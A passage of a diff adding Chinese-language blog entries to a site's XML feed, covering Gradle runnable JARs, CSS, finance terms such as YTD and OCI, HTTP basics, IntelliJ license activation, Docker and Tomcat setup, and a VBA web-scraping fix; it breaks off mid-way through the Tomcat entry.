+        <content type="html"><![CDATA[<h2 id="mainfest設定">mainfest設定</h2><p>maingest是用來定義擴充或檔案打包相關資料，產生可執行的Jar檔需要在build.gradle設定Main-Class Path</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jar &#123;</span><br><span class="line">    manifest &#123;</span><br><span class="line">        attributes <span class="string">&#x27;Main-Class&#x27;</span>: <span class="string">&#x27;com.swj.demo.DemoApplication&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="執行build-gradle">執行build gradle</h2><p><img src="/assets/img/blog/2022/20221120/gradle_build.png" alt="build_gradle"></p><h2 id="Jar檔產生路徑">Jar檔產生路徑</h2><p><img src="/assets/img/blog/2022/20221120/runnable_jar.png" alt="runnable_jar"></p><hr><h2 id="reference-34">reference</h2><ul><li><a href="https://zh.wikipedia.org/zh-tw/%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6">Mainfest files - <strong>wiki</strong></a></li><li><a href="https://stackoverflow.com/questions/21721119/creating-runnable-jar-with-gradle">Create runnable JAR</a></li><li><a href="https://medium.com/%E7%A8%8B%E5%BC%8F%E8%A3%A1%E6%9C%89%E8%9F%B2/%E6%80%8E%E9%BA%BC%E4%BD%BF%E7%94%A8-intellij-%E5%8C%85%E5%8F%AF%E5%9F%B7%E8%A1%8C%E7%9A%84-jar-%E6%AA%94%E5%91%A2-95f1d8353137">怎麼使用 Intellij 包可執行的 JAR 檔呢？ - MichaelXiao</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Intellij </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Jar </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSS Notebook</title>
+      <link href="/2022/10/26/2022-2022-10-27-css-notebook/"/>
+      <url>/2022/10/26/2022-2022-10-27-css-notebook/</url>
+      
+        <content type="html"><![CDATA[<h2 id="CSS-Cascading-Style-Sheets-階層式樣式表">CSS (Cascading Style Sheets) 階層式樣式表</h2><p>用來設置網頁的外觀，樣式及佈局</p><h2 id="Using-CSS"><a href="https://www.w3schools.com/css/css_howto.asp">Using CSS</a></h2><h4 id="three-way-insert-style-sheet">three way insert style sheet</h4><ul><li>Internal</li><li>External</li><li>Inline</li></ul><h4 id="Cascading-Order">Cascading Order</h4><h2 id="CSS-Selectors"><a href="https://www.w3schools.com/css/css_selectors.asp">CSS Selectors</a></h2><h2 id="CSS-Box-Model"><a href="https://www.w3schools.com/css/css_boxmodel.asp">CSS Box Model</a></h2><hr><h2 id="reference-33">reference</h2><ul><li><a href="https://blog.csdn.net/FourthC/article/details/102790710">雷丰阳JavaWeb学习笔记（一）：HTML、CCS、JavaScript笔记 - FourthC</a></li><li><a href="https://www.w3schools.com/html/html_css.asp">HTML CSS - W3C SCHOOL</a></li><li><a href="https://developer.mozilla.org/zh-TW/docs/Learn/Getting_started_with_the_web/CSS_basics">CSS 基礎概念 - MDN</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd </category>
+          
+          <category> Notebook </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Year to Date，YTD</title>
+      <link href="/2022/07/08/2022-2022-07-08-finance-noun-YTD/"/>
+      <url>/2022/07/08/2022-2022-07-08-finance-noun-YTD/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Inception-to-Date，ITD">Inception to Date，ITD</h2><blockquote><blockquote><p>Inception to Date(ITD) refers to the period of time begining the start date up to current date.</p></blockquote></blockquote><h2 id="Year-to-Date，YTD">Year to Date，YTD</h2><blockquote><p>Year to Date(YTD) refers to the period of time begining the first day of the current calendar year of fiscal year up to current date.</p></blockquote><h2 id="Month-to-Date，MTD">Month to Date，MTD</h2><blockquote><p>Month to Date(MTD) refers to the period of time between the 1st of the current month and the last finalized business day before current date.</p></blockquote><hr><h2 id="reference-31">reference</h2><ul><li><a href="https://www.investopedia.com/terms/y/ytd.asp">Year to Date (YTD) - Investopedia</a></li><li>[What are inception-to-date (ITD) balances? - cornell university]</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> finance </category>
+          
+          <category> period </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>債券換券要約，Exchange Offer</title>
+      <link href="/2022/07/08/2022-2022-07-08-finance-noun-exchange-offer/"/>
+      <url>/2022/07/08/2022-2022-07-08-finance-noun-exchange-offer/</url>
+      
+        <content type="html"><![CDATA[<h2 id="何謂換券要約Exchange-Offer">何謂換券要約Exchange Offer</h2><h3 id="定義-3">定義</h3><blockquote><p>指發行機構以特定條件，提供債券持有人將所持有未到期的債券，轉換為另一檔由同一發行機構所發行的債券。</p></blockquote><h3 id="目的">目的</h3><blockquote><p>可由下圖略知一二，當預期未來利率走跌，公司為了減少未來的利息支出壓力，提出以新換舊的方案，當然須提供債券持有人一些誘因才有可能達成交易的。</p></blockquote><p><img src="/assets/img/blog/2022/20220708/MSFT_ExchangeOffer.jpg" alt="MSFT_ExchangeOffers"></p><hr><h2 id="reference-32">reference</h2><ul><li><p><a href="https://www.ctbcbank.com/content/dam/twrbo/pdf/investment/20210824001.pdf">美國電話電報公司(AT&amp;T Inc.)債券換券要約(Exchange Offer) 通知</a></p></li><li><p><a href="https://bopfund.moneydj.com/savefile/FECB0071%E5%BE%AE%E8%BB%9F%E5%85%AC%E5%8F%B8%E7%BE%8E%E5%85%83%E5%85%AC%E5%8F%B8%E5%82%B5%E6%8F%9B%E5%88%B8%E6%94%B6%E8%B3%BC%E5%B0%88%E5%87%BD.pdf">FECB0071 微軟公司美元公司債換券計畫(Exchange Offers)通知</a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> finance </category>
+          
+          <category> bond </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Other Comprehensive Income，OCI</title>
+      <link href="/2022/06/30/2022-2022-06-30-finance-noun-oci/"/>
+      <url>/2022/06/30/2022-2022-06-30-finance-noun-oci/</url>
+      
+        <content type="html"><![CDATA[<h2 id="何謂OCI">何謂OCI</h2><ul><li>綜合損益 = 本期損益 + 其他綜合損益OCI</li></ul><ol><li>備供出售金融資產之未實現評價損益 (<strong>以前是列在資產負債表的股東權益增減科目</strong>)</li><li>現金流量避險工具之末實現評價損益(僅有效避險部分)</li><li>國外營運機構財報換算之兌換差額 (也就是匯兌損益)</li><li>資產重估增值</li><li>符合條件之確定福利計畫精算損益</li><li>採用<strong>權益法</strong>認列所享有之關聯企業及合資的其他綜合損益</li></ol><h3 id="備註">備註</h3><h4 id="長期投資或轉投資會根據持有目的與時間長短分為三類">長期投資或轉投資會根據持有目的與時間長短分為三類</h4><ol><li>持有至到期(權益法)</li><li>以交易目的而投資 (賺價差)</li><li>備供出售金融資產 (在取得時有意圖長期持有之目的，但不排除必要時仍得隨時處分變現之非衍生金融資產)</li></ol><hr><h2 id="reference-29">reference</h2><ul><li><a href="http://accountingkid.blogspot.com/2013/12/ifrs.html">IFRS 新玩意：綜合損益  - <strong>白話會計-邦尼BLOG</strong></a></li><li>其他綜合損益(OCI)的處理與表達  - <strong>白話會計-邦尼BLOG</strong></li><li><a href="https://bonddealerbook.pixnet.net/blog/post/202549406">如何解讀新制的綜合損益表 - <strong>總幹事耕讀筆記</strong></a></li><li>財務自由講堂 - 黃國華 p203</li><li><a href="https://accounting.sme.gov.tw/run.php?name=forum&amp;file=post&amp;p=339996">備供 - 經濟部中小企業部經濟部</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> finance </category>
+          
+          <category> accounting </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTTP協定</title>
+      <link href="/2022/06/30/2022-2022-06-30-java-web-http/"/>
+      <url>/2022/06/30/2022-2022-06-30-java-web-http/</url>
+      
+        <content type="html"><![CDATA[<h2 id="HTTP-Hypertext-Transport-Protocol">HTTP (Hypertext Transport Protocol)</h2><ul><li>超文本傳輸協定，用來傳輸超媒體文件(ex.html)</li><li>Stateless</li><li>定義了client 與 Server溝通的規則</li></ul><h2 id="HTTP-Request">HTTP Request</h2><h3 id="Request格式">Request格式</h3><blockquote><p>請求首行 (Request Line)<br>請求頭訊息（Request Header）<br>空行(CR+LF)<br>請求體 (Request Body)</p></blockquote><h3 id="GET">GET</h3><blockquote><p>沒有請求空行與請求體</p></blockquote><ul><li>請求首行：GET /Hello/index.jsp HTTP/1.1：GET請求，請求服務器路徑為Hello/index.jsp，協議為1.1；沒有請求體，所以請求信息會放在url上，即第一行上</li><li>Host:localhost：請求的主機名為localhost；</li><li>User-Agent : Mozilla/4.0 (compatible; MSIE 8.0…：與瀏覽器和OS相關的信息。有些網站會顯示用戶的系統版本和瀏覽器版本信息，這都是通過獲取User-Agent頭信息而來的；</li><li>Accept : /：告訴服務器，當前客戶端可以接收的文檔類型，/，就表示什麼都可以接收；</li><li>Accept-Language : zh-CN：當前客戶端支持的語言，可以在瀏覽器的工具選項中找到語言相關信息；</li><li>Accept-Encoding : gzip, deflate：支持的壓縮格式。數據在網絡上傳遞時，可能服務器會把數據壓縮後再發送；</li><li>Connection : keep-alive：客戶端支持的鏈接方式，保持一段時間鏈接，默認為3000ms；</li><li>Cookie :JSESSIONID=XXXXX：因為不是第一次訪問這個地址，所以會在請求中把上一次服務器響應中發送過來的Cookie在請求中一併發送過去。</li></ul><h3 id="POST">POST</h3><blockquote><p>请求有请求体，而GET请求没有请求体。所以POST可以提交大量数据，GET不能提交大量数据</p></blockquote><ul><li>POST /regist HTTP/1.1</li><li>Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/xaml+xml, application/x-ms-xbap, <em>/</em></li><li>Referer: <a href="http://localhost:8080/FirsWeb/">http://localhost:8080/FirsWeb/</a> ：請求來自哪個頁面</li><li>Accept-Language: zh-Hant-TW,zh-Hant;q=0.8,en-US;q=0.5,en;q=0.2</li><li>Content-Type: application/x-www-form-urlencoded ： 表單的數據類型</li><li>UA-CPU: AMD64</li><li>Accept-Encoding: gzip, deflate</li><li>User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko</li><li>Host: localhost:8080</li><li>Content-Length: 13</li><li>Connection: Keep-Alive</li><li>Cache-Control: no-cache</li><li>空行</li><li>username=test ： 請求體</li></ul><h2 id="HTTP-Response">HTTP Response</h2><h3 id="Response">Response</h3><blockquote><p>响應首行 (Response Line)<br>响應頭訊息（Response Header）<br>空行(CR+LF)<br>响應體(Response Body) ： 服務器傳遞給客戶端要使用的html頁面等數據</p></blockquote><ul><li>HTTP/1.1 200 OK： 協議版本 响應狀態碼 响應提示訊息</li><li>Server: Apache-Coyote/1.1</li><li>Content-Type: text/html;charset=UTF-8： 內容類型表示服務器回傳的數據內容類型</li><li>Content-Length: 274：响應內容長度；</li><li>Date: Tue, 07 Apr 2015 10:08:26 GMT</li></ul><h3 id="响應碼">响應碼</h3><ul><li><p>200：請求成功，瀏覽器會把響應體內容（通常是html）顯示在瀏覽器中；</p></li><li><p>404：請求的資源沒有找到，說明客戶端錯誤的請求了不存在的資源；</p></li><li><p>500：請求資源找到了，但服務器內部出現了錯誤；</p></li><li><p>302：重定向，當響應碼為302時，表示服務器要求瀏覽器重新再發一個請求，服務器會發送一個響應頭Location，它指定了新請求的URL地址；</p></li><li><p>以2xx的响应码：都表示成功</p></li><li><p>以3xx的响应码：都表示需要重新请求另一个资源</p></li><li><p>以4xx的响应码：都表示资源未找到（请求地址错误），服务器启动失败</p></li><li><p>以5xx的响应码：都表示服务器内部出错，（即代码错误）</p></li></ul><h2 id="MIME-TYPE">MIME TYPE</h2><ul><li>.html text/html</li><li>.txt text/plain</li><li>.jpeg,.jpg image/jpeg</li></ul><hr><h2 id="reference-30">reference</h2><ul><li>Java Web - 雷豐陽 P74 - P77</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>在公司如何啟用IntelliJ IDEA 2022.1.2授權</title>
+      <link href="/2022/06/21/2022-2022-06-21-IntelliJ-IDEA-Active/"/>
+      <url>/2022/06/21/2022-2022-06-21-IntelliJ-IDEA-Active/</url>
+      
+        <content type="html"><![CDATA[<h2 id="1-在Licenses頁面點選左下角Proxy-settings">1.在Licenses頁面點選左下角Proxy settings</h2><h2 id="2-選擇Auto-detect-proxy-settings">2.選擇Auto-detect proxy settings</h2><p><img src="/assets/img/blog/2022/20220621/IDEA_01.jpg" alt="IDEA PROXY SETTING"></p><h2 id="3-查詢Proxy設定，複製指令碼位址">3.查詢Proxy設定，複製指令碼位址</h2><p><img src="/assets/img/blog/2022/20220621/IDEA_02.jpg" alt="IDEA PROXY Config"></p><h2 id="4-確認後會導向瀏覽器，輸入JB-Account與密碼就可以啟用授權">4.確認後會導向瀏覽器，輸入JB Account與密碼就可以啟用授權</h2><p><img src="/assets/img/blog/2022/20220621/IDEA_03.jpg" alt="IDEA PROXY Config"></p><hr><h2 id="reference-28">reference</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> IntelliJ </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> IDE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Docker快速入門</title>
+      <link href="/2022/06/19/2022-2022-06-12-docker-quickstart/"/>
+      <url>/2022/06/19/2022-2022-06-12-docker-quickstart/</url>
+      
+        <content type="html"><![CDATA[<h2 id="docker概念">docker概念</h2><p><img src="/assets/img/blog/2022/20220619/DockerConcept.jpg" alt="DockerConcept"><br>DockerConcept.jpg</p><h2 id="install-docker">install docker</h2><ol><li>check kernal version &gt; 3.10</li></ol><blockquote><p>uname -r</p></blockquote><ol start="2"><li>install docker</li></ol><blockquote><p>yum install docker</p></blockquote><ol start="3"><li>run docker</li></ol><blockquote><p>systemctl start docker</p></blockquote><ol start="4"><li>check docker version</li></ol><blockquote><p>docker -v</p></blockquote><ol start="5"><li>開機啟動docker</li></ol><blockquote><p>systemctl enable docker</p></blockquote><ol start="6"><li>停止docker</li></ol><blockquote><p>systemctl stop docker</p></blockquote><h2 id="docker-常用指令">docker 常用指令</h2><h3 id="1-image相關">1.image相關</h3><table><thead><tr><th>操作</th><th>指令</th><th>說明</th></tr></thead><tbody><tr><td>search</td><td>docker search eg.docker search redis</td><td>搜尋image，也可以上docker hub尋找</td></tr><tr><td>pull</td><td>docker pull imageName:tag</td><td>tag是可選參數，默認為latest</td></tr><tr><td>list</td><td>docker images</td><td>查看local有哪些image可用</td></tr><tr><td>delete</td><td>docker rmi image-id</td><td>刪除local image</td></tr></tbody></table><h3 id="2-container操作">2.container操作</h3><blockquote><p>運行一個image就會產生一個container</p></blockquote><ol><li>搜尋tomcat image</li></ol><blockquote><p>docker seacher tomcat</p></blockquote><ol start="2"><li>從remote拉下image</li></ol><blockquote><p>docker pull tomcat</p></blockquote><ol start="3"><li>啟動tomcat image，–name給container一個名稱，-d後臺運行</li></ol><blockquote><p>docker run --name mytomcat -d tomcat:latest</p></blockquote><ol start="4"><li>查看在運行的container</li></ol><blockquote><p>docker ps</p></blockquote><ol start="5"><li>停止運行的container</li></ol><blockquote><p>docker stop containerId</p></blockquote><ol start="6"><li>查看所有容器</li></ol><blockquote><p>docker ps -a</p></blockquote><ol start="7"><li>啟動container</li></ol><blockquote><p>docker start containId</p></blockquote><ol start="8"><li>刪除一個container</li></ol><blockquote><p>docker rm containerId</p></blockquote><ol start="9"><li>啟動一個端口映射的tomcat，-p 主機端口：容器內部端口</li></ol><blockquote><p>docker run -d -p 8888:8080 tomcat</p></blockquote><ol start="10"><li>關閉linux防火牆</li></ol><blockquote><p>service firewalld status<br>service firewalld stop</p></blockquote><ol start="11"><li>查看container日誌</li></ol><blockquote><p>docker logs containerName/containId</p></blockquote><ol start="12"><li><a href="https://docs.docker.com/engine/reference/commandline/exec/">進入運行中的container</a></li></ol><blockquote><p>docker exec containerId command<br>ex. docker exec -it mytomcat /bin/bash</p></blockquote><hr><h2 id="reference-27">reference</h2><ul><li><a href="https://docs.docker.com/engine/install/centos/">Install docker - <strong>docker official site</strong></a></li><li><a href="https://www.cnblogs.com/cwsheng/p/13837502.html">Docker学习—概念及基本应用 - <strong>cwsheng blog</strong></a></li><li><a href="https://ithelp.ithome.com.tw/users/20103456/ironman/1320">用30天來介紹和使用 Docker - <strong>yangj26952</strong> </a></li><li><a href="https://hub.docker.com/">docker hun - official site</a></li><li><a href="https://www.twblogs.net/a/5e90b821bd9eee34209011b0">Docker部署tomcat出現404錯誤 - play8</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> docker </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>VBA透過IE爬蟲使用ExcelWB複製貼上錯訊「x80040100 存取被拒」</title>
+      <link href="/2022/05/26/2022-2022-05-26-vba-web-crawler-error-handle/"/>
+      <url>/2022/05/26/2022-2022-05-26-vba-web-crawler-error-handle/</url>
+      
+        <content type="html"><![CDATA[<h2 id="問題描述">問題描述</h2><p>這是一個爬蟲程式，開啟的網頁是一個表格，透過ExcelWB提供的API功能select all與copy，再貼到Excel的Sheet上。<br>不過有的時候會發生在程式碼21行的地方出現「x80040100 存取被拒」的訊息。</p><h2 id="解決-4">解決</h2><h3 id="原因-2">原因</h3><p>從官方的文件的錯誤訊息看來「Trying to revoke a drop target that has not been registered」，研判是VBA在呼叫<br>兩個IE的API間有著未被撤銷的物件導致在copy網頁時發生問題。猜測由VBA呼叫這兩個API時為獨立的，所以可能因為select all尚未執行完，<br>而又要執行copy的動作時拋出異常</p><h3 id="處理">處理</h3><p>程式第41行透過VBA提供的Application.Wait API等待5秒鐘，再執行就沒有問題了</p><h2 id="程式">程式</h2><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> IE <span class="keyword">As</span> InternetExplorer</span><br><span class="line"><span class="keyword">Dim</span> doc <span class="keyword">As</span> HTMLDocument</span><br><span class="line"><span class="keyword">Dim</span> URL <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://mops.twse.com.tw/mops/web/ajax_t51sb01?step=1&amp;firstin=1&amp;TYPEK=sii&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">Set</span> IE = CreateObject(<span class="string">&quot;InternetExplorer.Application&quot;</span>)</span><br><span class="line"></span><br><span class="line">Sheets(<span class="number">1</span>).Cells.ClearContents</span><br><span class="line"></span><br><span class="line"><span class="keyword">With</span> IE</span><br><span class="line">    .Visible = <span class="literal">True</span></span><br><span class="line">    .navigate URL</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">Do</span> <span class="keyword">While</span> IE.readyState &lt;&gt; READYSTATE_COMPLETE <span class="built_in">Or</span> IE.Busy: DoEvents: <span class="keyword">Loop</span></span><br><span class="line"></span><br><span class="line">    .ExecWB <span class="number">17</span>, <span class="number">2</span></span><br><span class="line">    <span class="comment">&#x27;Application.Wait (Now + TimeValue(&quot;00:00:05&quot;))</span></span><br><span class="line">    .ExecWB <span class="number">12</span>, <span class="number">2</span></span><br><span class="line">    Sheets(<span class="number">1</span>).<span class="keyword">Select</span></span><br><span class="line">    Range(<span class="string">&quot;A1&quot;</span>).Activate</span><br><span class="line">    ActiveSheet.PasteSpecial Format:=<span class="string">&quot;HTML&quot;</span>, _</span><br><span class="line">        link:=<span class="literal">False</span>, DisplayAsIcon:=<span class="literal">False</span>, NoHTMLFormatting:=<span class="literal">True</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"></span><br><span class="line">IE.Quit</span><br><span class="line"></span><br><span class="line">MsgBox <span class="string">&quot;Job Close&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><hr><h2 id="reference-26">reference</h2><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/com/com-error-codes-1">COM Error Codes (Generic) - Microsoft Doc</a></li><li><a href="https://gist.github.com/Stephanevg/82928b1af35e9812ae632180beebe692">print-webpageToPdf.ps1 - Stephanevg</a></li><li><a href="https://simpleexcelvba.com/web-automation-using-internet-explorer/">Web automation using Internet Explorer - Tomasz Płociński</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Excel </category>
+          
+          <category> VBA </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web crawler </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>輸入網址後發生的事</title>
+      <link href="/2022/05/15/2022-2022-05-16-java-web-WhatHappensWhenTypeURLInABrowser-copy/"/>
+      <url>/2022/05/15/2022-2022-05-16-java-web-WhatHappensWhenTypeURLInABrowser-copy/</url>
+      
+        <content type="html"><![CDATA[<h2 id="輸入網址後發生的事">輸入網址後發生的事</h2><p><img src="/assets/img/blog/2022/20220516/WhatHappensWhenYouTypeInAURL.jpg" alt="WhatHappensWhenTypeURK"><br>圖片來源: <a href="https://twitter.com/manekinekko/status/1281704000572858375">https://twitter.com/manekinekko/status/1281704000572858375</a></p><h2 id="從輸入網址列到渲染畫面，過程經歷了什麼事"><a href="https://w3c.hexschool.com/blog/8d691e4f?fbclid=IwAR1MUt5WukzBVUh41LRk2rxjB12yjXLmBYXAwWOro-nW4L3SdIFYCNYjFG8">從輸入網址列到渲染畫面，過程經歷了什麼事</a></h2><hr><h2 id="reference-25">reference</h2><ul><li><a href="https://w3c.hexschool.com/blog/8d691e4f?fbclid=IwAR1MUt5WukzBVUh41LRk2rxjB12yjXLmBYXAwWOro-nW4L3SdIFYCNYjFG8">從輸入網址列到渲染畫面，過程經歷了什麼事？ - W3CHEXSCHOOL</a></li><li><a href="https://twitter.com/manekinekko/status/1281704000572858375?fbclid=IwAR0juVukGwVAnfR2hdnXRFaYDe2PMkv6EfdjzTp6Q56PYqFPdvifwWY1Oi8">what happens when you type in a URL in an address bar in a browser? - Wassim Chegham</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> http </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Tomcat</title>
+      <link href="/2022/05/14/2022-2022-05-14-java-web-tomcat/"/>
+      <url>/2022/05/14/2022-2022-05-14-java-web-tomcat/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Application-server">Application server</h2><ul><li>Tomcat - Apache：應用最廣的JavaWeb服務器</li><li>JBoss - Redhat：支援Java EE</li><li>GlassFish - Oracle</li><li>Resin - Caucho：支援Java EE，應用越來越廣</li><li>Weblogic - Oracle：需要購買</li><li>Websphere - IBM：需要購買</li></ul><h2 id="tomcat版本">tomcat版本</h2><ul><li>tomcat6：support serverlet2.5、jsp2.1、el (2.5需以請求配置文件，7以後annotation)</li><li>tomcat7：support serverlet3.0、jsp2.2、el2.2、websocket1.1</li><li>tomcat8：support serverlet3.1、jsp2.3、el3.0、websocket1.1</li><li>tomcat9：support serverlet4.0、jsp2.3、el3.2、websocket1.1</li></ul><h2 id="Donwload"><a href="https://tomcat.apache.org/download-80.cgi">Donwload</a></h2><ul><li>step1<br><img src="/assets/img/blog/2022/20220514/tomcat_download_01.jpg" alt="tomcat_download_01"></li><li>step2<br><img src="/assets/img/blog/2022/20220514/tomcat_download_02.jpg" alt="tomcat_download_02"></li></ul><h2 id="Setting-and-run">Setting and run</h2><ul><li>step1:unzip apache-tomcat-8.5.78-windows-x64.zip</li><li>step2：setting JAVA_HOME<br><img src="/assets/img/blog/2022/20220514/tomcat_setting_01.jpg" alt="tomcat_setting_01"></li><li>step3：click tomcat資料夾下bin中<strong>startup.bat</strong>，但出現一閃即逝的畫面</li><li>step4：cmd 輸入catalina run出現以下錯誤訊息，研判中文資料夾路徑可能有問題，因Jar檔皆存在<br><img src="/assets/img/blog/2022/20220514/tomcat_setting_02.jpg" alt="tomcat_setting_02"></li><li>step5：搬到非中文路徑下，執行正常<br><img src="/assets/img/blog/2022/20220514/tomcat_setting_03.jpg" alt="tomcat_setting_03"></li><li>step6：default 8080，可以修改conf\server.xml<br><img src="/assets/img/blog/2022/20220514/tomcat_setting_04.jpg" alt="tomcat_setting_04"></li><li>step7：關閉tomcat請用shutdown.bat</li><li>other：服務器集群<br><img src="/assets/img/blog/2022/20220514/tomcat_setting_05.jpg" alt="tomcat_setting_05"></li></ul><h2 id="Tomcat目錄結構">Tomcat目錄結構</h2><ul><li>bin<blockquote><p>包含tomcat啟動命令、停止tomcat命令等可執行文件</p></blockquote></li><li>conf<blockquote><p>tomcat的設定檔文件</p></blockquote></li><li>lib<blockquote><p>tomcat運行所依賴的jar</p></blockquote></li><li>logs<blockquote><p>log存放位置</p></blockquote></li><li>temp<blockquote><p>tomcat存取臨時文件的文件夾</p></blockquote></li><li>webapps<blockquote><p>放置所有的web項目，每一個資料夾就是一個web項目</p></blockquote><ul><li>tomcat啟動默認的是root目錄 -&gt; localhost:8080</li><li>一般訪問web項目默認是展示index.html -&gt; localhost:8080/docs</li></ul></li><li>work<blockquote><p>保存tomcat運行時編譯的一些文件</p></blockquote></li></ul><h2 id="eclipse整合tomcat">eclipse整合tomcat</h2><ul><li>step1：show server tab<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_01.jpg" alt="tomcat_embeded_01"></li><li>setp2：select server<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_02.jpg" alt="tomcat_embeded_02"></li><li>setp3：embeded tomcat<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_03.jpg" alt="tomcat_embeded_03"></li><li>setp4<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_04.jpg" alt="tomcat_embeded_04"></li><li>setp5：<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_05.jpg" alt="tomcat_embeded_05"></li></ul><h3 id="summary">summary</h3><ul><li>eclipse整合tomcat後，他創建的是一個服務器鏡像，也就是在eclipse的副本</li><li>default路徑：workspace.metadata.plugins\org.eclipse.wst.server.core\tmp0</li><li>修改預設路徑<br><img src="/assets/img/blog/2022/20220514/tomcat_embeded_06.jpg" alt="tomcat_embeded_06"></li></ul><h2 id="dynamic-web-project">dynamic web project</h2><h3 id="create-project">create project</h3><ul><li>step1<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_01.jpg" alt="create_project_01"></li><li>step2<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_02.jpg" alt="create_project_02"></li><li>step3<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_03.jpg" alt="create_project_03"></li><li>step4<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_04.jpg" alt="create_project_04"></li><li>step5<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_05.jpg" alt="create_project_05"></li><li>step6<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_06.jpg" alt="create_project_06"></li><li>step7<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_07.jpg" alt="create_project_07"></li><li>step8<br><img src="/assets/img/blog/2022/20220514/tomcat_createproject_08.jpg" alt="create_project_08"></li></ul><h3 id="project-file-structure">project file structure</h3><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">- 動態web工程</span><br><span class="line">    - META-INF：項目基礎訊息(不用管)</span><br><span class="line">    - WEB-INF：</span><br><span class="line">        - lib：以後引入的jar包放在lib中，它會自動添加到buildpath</span><br><span class="line">        - web.xml：</span><br><span class="line">            整個web應用的配置設定</span><br><span class="line">            &lt;welcom-file-list&gt;定義項目啟動默認的訪問頁面</span><br><span class="line"></span><br><span class="line">- 動態創建web：</span><br><span class="line">  - eclipse：FirstWeb</span><br><span class="line">    - src：             寫java代碼</span><br><span class="line">    - build：           java代碼編譯後class存放位置</span><br><span class="line">    - WebContent：      網頁及靜態文件</span><br><span class="line">        - META-INFO</span><br><span 